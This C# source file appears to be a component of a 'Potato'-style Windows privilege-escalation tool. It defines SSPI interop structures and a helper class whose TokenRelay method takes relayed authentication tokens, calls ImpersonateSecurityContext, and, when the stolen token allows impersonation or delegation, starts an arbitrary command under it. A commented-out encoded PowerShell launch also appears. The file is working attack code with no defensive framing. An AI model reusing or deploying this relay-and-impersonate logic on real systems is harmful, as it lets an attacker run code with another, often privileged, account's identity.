using System;
using System.Security.Principal;
using System.Runtime.InteropServices;
using System.Text;
using System.ComponentModel;
using QHelper;
using System.Threading;
using NtApiDotNet;
using SandboxAnalysisUtils;

using Potato;

// SSPIHelper code from PInvoke
// modified slightly and cleaned a little.
namespace SSPITest
{
    
    public enum SecBufferType
    {
        SECBUFFER_VERSION = 0,
        SECBUFFER_EMPTY = 0,
        SECBUFFER_DATA = 1,
        SECBUFFER_TOKEN = 2
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SecBuffer : IDisposable
    {
        public int cbBuffer;
        public int BufferType;
        public IntPtr pvBuffer;


        public SecBuffer(int bufferSize)
        {
            cbBuffer = bufferSize;
            BufferType = (int)SecBufferType.SECBUFFER_TOKEN;
            pvBuffer = Marshal.AllocHGlobal(bufferSize);
        }

        public SecBuffer(byte[] secBufferBytes)
        {
            cbBuffer = secBufferBytes.Length;
            BufferType = (int)SecBufferType.SECBUFFER_TOKEN;
            pvBuffer = Marshal.AllocHGlobal(cbBuffer);
            Marshal.Copy(secBufferBytes, 0, pvBuffer, cbBuffer);
        }

        public SecBuffer(byte[] secBufferBytes, SecBufferType bufferType)
        {
            cbBuffer = secBufferBytes.Length;
            BufferType = (int)bufferType;
            pvBuffer = Marshal.AllocHGlobal(cbBuffer);
            Marshal.Copy(secBufferBytes, 0, pvBuffer, cbBuffer);
        }

        public void Dispose()
        {
            if (pvBuffer != IntPtr.Zero)
            {
                Marshal.FreeHGlobal(pvBuffer);
                pvBuffer = IntPtr.Zero;
            }
        }
    }

   
    [StructLayout(LayoutKind.Sequential)]
    public struct SecBufferDesc : IDisposable
    {

        public int ulVersion;
        public int cBuffers;
        public IntPtr pBuffers;

        public SecBufferDesc(int bufferSize)
        {
            ulVersion = (int)SecBufferType.SECBUFFER_VERSION;
            cBuffers = 1;
            SecBuffer ThisSecBuffer = new SecBuffer(bufferSize);
            pBuffers = Marshal.AllocHGlobal(Marshal.SizeOf(ThisSecBuffer));
            Marshal.StructureToPtr(ThisSecBuffer, pBuffers, false);
        }

        public SecBufferDesc(byte[] secBufferBytes)
        {
            ulVersion = (int)SecBufferType.SECBUFFER_VERSION;
            cBuffers = 1;
            SecBuffer ThisSecBuffer = new SecBuffer(secBufferBytes);
            pBuffers = Marshal.AllocHGlobal(Marshal.SizeOf(ThisSecBuffer));
            Marshal.StructureToPtr(ThisSecBuffer, pBuffers, false);
        }

        

        public void Dispose()
        {
            if (pBuffers != IntPtr.Zero)
            {
                if (cBuffers == 1)
                {
                    SecBuffer ThisSecBuffer = (SecBuffer)Marshal.PtrToStructure(pBuffers, typeof(SecBuffer));
                    ThisSecBuffer.Dispose();
                }
                else
                {
                    for (int Index = 0; Index < cBuffers; Index++)
                    {
                        int CurrentOffset = Index * Marshal.SizeOf(typeof(SecBuffer));
                        IntPtr SecBufferpvBuffer = Marshal.ReadIntPtr(pBuffers, CurrentOffset + Marshal.SizeOf(typeof(int)) + Marshal.SizeOf(typeof(int)));
                        Marshal.FreeHGlobal(SecBufferpvBuffer);
                    }
                }

                Marshal.FreeHGlobal(pBuffers);
                pBuffers = IntPtr.Zero;
            }
        }

        public byte[] GetSecBufferByteArray()
        {
            byte[] Buffer = null;

            if (pBuffers == IntPtr.Zero)
            {
                throw new InvalidOperationException("Object has already been disposed!!!");
            }

            if (cBuffers == 1)
            {
                SecBuffer ThisSecBuffer = (SecBuffer)Marshal.PtrToStructure(pBuffers, typeof(SecBuffer));

                if (ThisSecBuffer.cbBuffer > 0)
                {
                    Buffer = new byte[ThisSecBuffer.cbBuffer];
                    Marshal.Copy(ThisSecBuffer.pvBuffer, Buffer, 0, ThisSecBuffer.cbBuffer);
                }
            }
            else
            {
                int BytesToAllocate = 0;

                for (int Index = 0; Index < cBuffers; Index++)
                {
                    //calculate the total number of bytes we need to copy...
                    int CurrentOffset = Index * Marshal.SizeOf(typeof(SecBuffer));
                    BytesToAllocate += Marshal.ReadInt32(pBuffers, CurrentOffset);
                }

                Buffer = new byte[BytesToAllocate];

                for (int Index = 0, BufferIndex = 0; Index < cBuffers; Index++)
                {
                    //Now iterate over the individual buffers and put them together into a byte array...
                    int CurrentOffset = Index * Marshal.SizeOf(typeof(SecBuffer));
                    int BytesToCopy = Marshal.ReadInt32(pBuffers, CurrentOffset);
                    IntPtr SecBufferpvBuffer = Marshal.ReadIntPtr(pBuffers, CurrentOffset + Marshal.SizeOf(typeof(int)) + Marshal.SizeOf(typeof(int)));
                    Marshal.Copy(SecBufferpvBuffer, Buffer, BufferIndex, BytesToCopy);
                    BufferIndex += BytesToCopy;
                }
            }

            return (Buffer);
        }
    }
    //
    [StructLayout(LayoutKind.Sequential)]
    public struct SECURITY_INTEGER
    {
        public uint LowPart;
        public int HighPart;
        public SECURITY_INTEGER(int dummy)
        {
            LowPart = 0;
            HighPart = 0;
        }
    };
    //
    [StructLayout(LayoutKind.Sequential)]
    public struct SECURITY_HANDLE
    {
        public IntPtr LowPart;
        public IntPtr HighPart;
        public SECURITY_HANDLE(int dummy)
        {
            LowPart = HighPart = IntPtr.Zero;
        }
    };
    //
    public class SSPIHelper
    {
        //public static AutoResetEvent power_event = new AutoResetEvent(false);

        bool bContinueServer = true;
        public const int SEC_E_OK = 0;
        public const int SEC_I_CONTINUE_NEEDED = 0x90312;
        
        const int SECPKG_CRED_INBOUND = 1;
        const int SECURITY_NATIVE_DREP = 0x10;
        const int MAX_TOKEN_SIZE = 12288;
        //
        SECURITY_HANDLE _hInboundCred = new SECURITY_HANDLE(0);
        public SECURITY_HANDLE _hServerContext = new SECURITY_HANDLE(0);
        //

        public const int ISC_REQ_REPLAY_DETECT = 0x00000004;
        public const int ISC_REQ_SEQUENCE_DETECT = 0x00000008;
        public const int ISC_REQ_CONFIDENTIALITY = 0x00000010;
       
        public const int ISC_REQ_CONNECTION = 0x00000800;
        

        public const int STANDARD_CONTEXT_ATTRIBUTES = ISC_REQ_CONFIDENTIALITY | ISC_REQ_REPLAY_DETECT | ISC_REQ_SEQUENCE_DETECT | ISC_REQ_CONNECTION;

       
        bool _bGotServerCredentials = false;
        bool _bGotServerContext = false;

        

        [DllImport("advapi32.dll", CharSet = CharSet.Auto)]
        public static extern bool GetUserName(StringBuilder sb, ref Int32 length);

       
        [DllImport("secur32.dll", CharSet = CharSet.Auto)]
        static extern int AcquireCredentialsHandle(
            string pszPrincipal,                                                   //SEC_CHAR*
            string pszPackage,                                                     //SEC_CHAR* //"Kerberos","NTLM","Negotiative"
            int fCredentialUse,
            IntPtr PAuthenticationID,                                              //_LUID AuthenticationID,//pvLogonID, //PLUID
            IntPtr pAuthData,                                                      //PVOID
            int pGetKeyFn,                                                         //SEC_GET_KEY_FN
            IntPtr pvGetKeyArgument,                                               //PVOID
            ref SECURITY_HANDLE phCredential,                                      //SecHandle //PCtxtHandle ref
            ref SECURITY_INTEGER ptsExpiry);                                       //PTimeStamp //TimeStamp ref

     

        [DllImport("secur32.dll", CharSet = CharSet.Auto, SetLastError = false)]
        static extern int AcceptSecurityContext(
            ref SECURITY_HANDLE phCredential,
            IntPtr phContext,
            ref SecBufferDesc pInput,
            uint fContextReq,
            uint TargetDataRep,
            out SECURITY_HANDLE phNewContext,
            out SecBufferDesc pOutput,
            out uint pfContextAttr,
            out SECURITY_INTEGER ptsTimeStamp);

        [DllImport("secur32.dll", CharSet = CharSet.Auto, SetLastError = false)]
        static extern int AcceptSecurityContext(
            ref SECURITY_HANDLE phCredential,
            ref SECURITY_HANDLE phContext,
            ref SecBufferDesc pInput,
            uint fContextReq,
            uint TargetDataRep,
            out SECURITY_HANDLE phNewContext,
            out SecBufferDesc pOutput,
            out uint pfContextAttr,
            out SECURITY_INTEGER ptsTimeStamp);
    
        [DllImport("secur32.dll", CharSet = CharSet.Auto, SetLastError = false)]
        public static extern int ImpersonateSecurityContext(ref SECURITY_HANDLE phContext);

        string _sAccountName = WindowsIdentity.GetCurrent().Name;

        public SSPIHelper()
        {

        }

        public SSPIHelper(string sRemotePrincipal)
        {
            _sAccountName = sRemotePrincipal;
        }

        

        // This is what we use for all the token stuff.
        public void InitializeServer(byte[] clientToken, out byte[] serverToken, out bool bContinueProcessing)
        {
            serverToken = null;
            bContinueProcessing = true;
            SECURITY_INTEGER NewLifeTime = new SECURITY_INTEGER(0);

            if (!_bGotServerCredentials)
            {
                Console.WriteLine(_sAccountName);
                if (AcquireCredentialsHandle(
                    _sAccountName,
                    "Negotiate",
                    SECPKG_CRED_INBOUND,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    0,
                    IntPtr.Zero,
                    ref _hInboundCred,
                    ref NewLifeTime) != SEC_E_OK)
                    
                {
                    throw new Exception("Couldn't acquire server credentials handle!!!");
                }
                Console.WriteLine("AcquireCredentialsHandle DONE");
                _bGotServerCredentials = true;
            }
            //
            SecBufferDesc ServerToken = new SecBufferDesc(MAX_TOKEN_SIZE);
            SecBufferDesc ClientToken = new SecBufferDesc(clientToken);
            //
            try
            {
                int ss = -1; 
                uint uNewContextAttr = 0;

                if (!_bGotServerContext) // check if we have the context yet
                {
                    
                    ss = AcceptSecurityContext(ref _hInboundCred,        // [in] handle to the credentials
                        IntPtr.Zero,                                     // [in/out] handle partially formed context. NULL the first time
                        ref ClientToken,                                 // [in] pointer to the input buffers
                        STANDARD_CONTEXT_ATTRIBUTES,                     // [in] required context attributes
                        SECURITY_NATIVE_DREP,                            // [in] data representation on the target
                        out _hServerContext,                             // [in/out] receives the new context handle    
                        out ServerToken,                                 // [in/out] pointer to the output buffers
                        out uNewContextAttr,                             // [out] receives the context attributes        
                        out NewLifeTime);                                // [out] receives the life span of the security context
                    Console.WriteLine("AcceptSecurityContext__1 DONE");
                }
                else
                {
                    ss = AcceptSecurityContext(ref _hInboundCred,        // [in] handle to the credentials
                        ref _hServerContext,                             // [in/out] handle of partially formed context. NULL the first time
                        ref ClientToken, //NOT a token[InBuffDesc]       // [in] pointer to the input buffers
                        STANDARD_CONTEXT_ATTRIBUTES,                     // [in] required context attributes
                        SECURITY_NATIVE_DREP,                            // [in] data representation on the target
                        out _hServerContext,                             // [in/out] receives the new context handle    
                        out ServerToken,                                 // [in/out] pointer to the output buffers
                        out uNewContextAttr,                             // [out] receives the context attributes        
                        out NewLifeTime);                                // [out] receives the life span of the security context
                    Console.WriteLine("AcceptSecurityContext__2 DONE");
                }

                if (ss != SEC_E_OK && ss != SEC_I_CONTINUE_NEEDED)
                {
                    Console.WriteLine("AcceptSecurityContext() failed!!!");
                    Console.WriteLine(new Win32Exception(Marshal.GetLastWin32Error()));
                }

                if (!_bGotServerContext)
                {
                    _bGotServerContext = true;
                }

                serverToken = ServerToken.GetSecBufferByteArray();

                bContinueProcessing = ss != SEC_E_OK;
            }
            finally
            {
                ClientToken.Dispose();
                ServerToken.Dispose();
            }
        }
        //
        public static void mygetuser()
        { 
            StringBuilder Buffer = new StringBuilder(64);
            int nSize = 64;
            GetUserName(Buffer, ref nSize);
            Console.WriteLine("You are now: {0}", Buffer.ToString());
        }
        //
        public void TokenRelay(BlockingCollection<byte[]> hashesIn, BlockingCollection<byte[]> hashesOut, String command)
        {
            while (bContinueServer)
            {

                byte[] out_buffer = null;
                byte[] hash = hashesIn.Take();
                InitializeServer(hash, out out_buffer, out bContinueServer);
                hashesOut.Add(out_buffer);
                if (bContinueServer)
                {

                    hash = hashesIn.Take();
                    InitializeServer(hash, out out_buffer, out bContinueServer);

                    ImpersonateSecurityContext(ref _hServerContext);

                    NtToken thread_token = NtToken.OpenThreadToken();

                    if (thread_token.ImpersonationLevel.ToString() == "Impersonation" || thread_token.ImpersonationLevel.ToString() == "Delegation")
                    {
                        //TokenUtils.CreateProcessForToken("powershell.exe -EncodedCommand " + command, thread_token, true);
                        TokenUtils.CreateProcessForToken(command, thread_token, true);
                        Console.WriteLine("Process Created Successfully");
                        Shell.NtShell = true;
                    }
                    else
                    {
                        Console.WriteLine("IMPERSONATION LEVEL IS {0} ACCESS DENIED !!!", thread_token.ImpersonationLevel.ToString());
                        Console.WriteLine("Primary Token Shell Starting ....");
                        Shell.NtShell = false;
                    }

                    hashesOut.Add(new byte[] { 99 }); // if finished pass 99
                }
            }
        }
    }
}